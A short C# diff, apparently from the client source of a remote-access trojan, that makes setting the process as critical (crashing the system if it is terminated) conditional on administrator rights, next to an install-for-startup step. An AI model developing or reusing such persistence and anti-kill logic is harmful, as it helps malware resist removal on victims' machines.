@@ -34,7 +34,7 @@ namespace Client
             if (Convert.ToBoolean(Settings.Install))
                 NormalStartup.Install();
 
-            if (Convert.ToBoolean(Settings.BDOS))
+            if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
                 ProcessCritical.Set();
 
 #if DEBUG
